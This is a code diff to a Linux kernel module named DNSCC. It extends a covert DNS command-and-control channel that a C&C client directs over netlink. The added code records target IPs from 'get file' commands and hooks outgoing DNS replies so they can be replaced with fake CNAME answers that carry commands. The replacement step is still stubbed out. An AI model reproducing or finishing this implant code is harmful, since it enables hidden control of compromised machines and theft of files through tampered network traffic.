@@ -52,14 +52,32 @@ struct QUESTION
 	uint16_t qtype;
 	uint16_t qclass;
 };
+
+/* List for filtering outgoing dns reply packets */ 
+/* Sending command with the cli client
+ * 1, CLI sends a netlink message to kernel module
+ * 2, Validate message, and make a connection enrty in conn_out_list
+ * 3, Every outgoing dns client response will be matched against conn_out_list
+ * 4, After match found, the original packet will be replaced with a fake CNAME dns reply
+ * 5, Client will query that fake CNAME, then we send out the original reply
+ */
+struct conn_out_data{
+	uint32_t ip_addr;
+	uint16_t stage;//see #define
+	struct sk_buff *orig_skb;
+	struct list_head list;
+};
+
+struct conn_out_data conn_out_list;
+
 /* Struct for identifying a connection in the linked list */
-struct conn_data{
+struct conn_in_data{
 	uint32_t ip_addr;
 	uint32_t connection_id;
 	struct list_head list;
 };
 
-struct conn_data conn_list;
+struct conn_in_data conn_in_list;
 
 /* Netlink socket for communication between this module and the user space C&C client */
 
@@ -78,9 +96,13 @@ static void dnscc_nl_recv_msg(struct sk_buff *skb){
 	msg = (dnscc_msg*) nlmsg_data(nlh);
 	switch(msg->type){
 		case 1: {
+				struct conn_out_data* c;
 				get_file_msg* gfmsg = msg->data;
 				printk(KERN_INFO "[DNSCC] Netlink get file message IP: %pI4 Remote File: %s ", &gfmsg->ip, gfmsg->remote_file);
-	
+				c = kmalloc(sizeof(*c), GFP_DMA);
+				c->ip_addr = gfmsg->ip.s_addr;
+				INIT_LIST_HEAD(&c->list);
+				list_add(&c->list,&conn_out_list.list);
 				break;
 			}
 		default:
@@ -95,13 +117,13 @@ static void dnscc_nl_recv_msg(struct sk_buff *skb){
  * TODO: is there any chance of generating NULL as unique id?
  */
 uint32_t generate_connection_id(uint32_t ip_addr, uint16_t sport){
-	struct conn_data* c;
+	struct conn_in_data* c;
 	printk(KERN_DEBUG "[DNSCC] Generating new connection id");
 	c = kmalloc(sizeof(*c), GFP_DMA);
 	c->ip_addr = ip_addr;
 	c->connection_id = ip_addr ^ sport;
 	INIT_LIST_HEAD(&c->list);
-	list_add(&c->list,&conn_list.list);
+	list_add(&c->list,&conn_in_list.list);
 	return c->connection_id;
 }
 
@@ -111,9 +133,9 @@ uint32_t generate_connection_id(uint32_t ip_addr, uint16_t sport){
  * */
 uint32_t check_connection_exists(uint32_t ip_addr){
 	uint32_t ret;
-	struct conn_data* c;
+	struct conn_in_data* c;
 	ret = 0;
-	list_for_each_entry(c,&conn_list.list,list){
+	list_for_each_entry(c,&conn_in_list.list,list){
 		if(c->ip_addr == ip_addr){
 			printk(KERN_DEBUG "[DNSCC] Match found! Connection id: %u", c->connection_id);
 			ret = c->connection_id;
@@ -125,9 +147,9 @@ uint32_t check_connection_exists(uint32_t ip_addr){
 /* Remove the connection from linked list and return the connection id*/
 uint32_t remove_connection(uint32_t ip_addr){
 	uint32_t ret;
-	struct conn_data *c,*temp;
+	struct conn_in_data *c,*temp;
 	ret = 0;
-	list_for_each_entry_safe(c,temp,&conn_list.list,list){
+	list_for_each_entry_safe(c,temp,&conn_in_list.list,list){
 		if(c->ip_addr == ip_addr){
 			ret = c->connection_id;
 			list_del(&c->list);
@@ -139,6 +161,25 @@ uint32_t remove_connection(uint32_t ip_addr){
 
 
 }
+
+/* Out conn helpers */
+/* Check if we need to send command to this ip 
+ * if yes, return 1, else 0
+ * */
+uint16_t check_command_exists(uint32_t ip_addr){
+	uint16_t ret;
+	struct conn_out_data* c;
+	ret = 0;
+	list_for_each_entry(c,&conn_out_list.list,list){
+		if(c->ip_addr == ip_addr){
+			printk(KERN_DEBUG "[DNSCC] Match found! Command for %pI4",&ip_addr);
+			ret = 1;
+		}
+	
+	}
+	return ret;
+}
+
 
 //TODO:Removeme static const uint16_t port = 53;
 unsigned char* read_dns_name(unsigned char* b, unsigned char* buffer, int* count){
@@ -262,6 +303,11 @@ static unsigned int dnscc_send(unsigned int hooknum, struct sk_buff* skb, const 
 	if(query_bit ){
 		dns_name = read_dns_name(&data[sizeof(struct DNS_HEADER)],data,&dnsn_count);
 		printk(KERN_INFO "[DNSCC] Outgoing DNS answer packet id %u dns-name %s answer = %d \n",ntohs(dns_h->query_id),dns_name,query_bit);
+		/* check if we need to send out a command to this client*/
+		if(check_command_exists(iph->daddr) == 1){
+			printk(KERN_INFO "[DNSCC] C&C command found for %pI4 replacing original DNS reply",&iph->daddr);
+		//	return NF_STOLEN;
+		}
 		kfree(dns_name);
 		}
 	return NF_ACCEPT;
@@ -295,15 +341,17 @@ static __init int my_init(void){
 	nf_register_hook(&nfho_recv);					//register netfilter hook
 	printk(KERN_INFO "[DNSCC] dnscc_recv kernel module loaded\n");
 	/* Create llist for identifying incoming connections */
-	INIT_LIST_HEAD(&conn_list.list);
-
+	INIT_LIST_HEAD(&conn_in_list.list);
+	INIT_LIST_HEAD(&conn_out_list.list);
 
 	return 0;
 }
 
 static __exit void my_exit(void){
-	struct conn_data *c;
-	struct conn_data *tmp;
+	struct conn_in_data *cin;
+	struct conn_out_data *cout;
+	struct conn_in_data *tmpin;
+	struct conn_out_data *tmpout;
 	/* release netlink socket */
 	netlink_kernel_release(nl_sk);
 	nf_unregister_hook(&nfho_send);				//unregister netfilter hook
@@ -311,10 +359,14 @@ static __exit void my_exit(void){
 	nf_unregister_hook(&nfho_recv);				//unregister netfilter hook
 	printk(KERN_INFO "[DNSCC] dnscc_recv kernel module unloaded\n");
 	/* Remove all elements from conn_list */
-	list_for_each_entry_safe(c,tmp,&conn_list.list, list){
-		printk(KERN_DEBUG "[DNSCC] freeing node %u\n", c->connection_id);
-		list_del(&c->list);
-		kfree(c);
+	list_for_each_entry_safe(cin,tmpin,&conn_in_list.list, list){
+		printk(KERN_DEBUG "[DNSCC] freeing node %u\n", cin->connection_id);
+		list_del(&cin->list);
+		kfree(cin);
+	}
+	list_for_each_entry_safe(cout,tmpout,&conn_out_list.list, list){
+		list_del(&cout->list);
+		kfree(cout);
 	}
 }
 
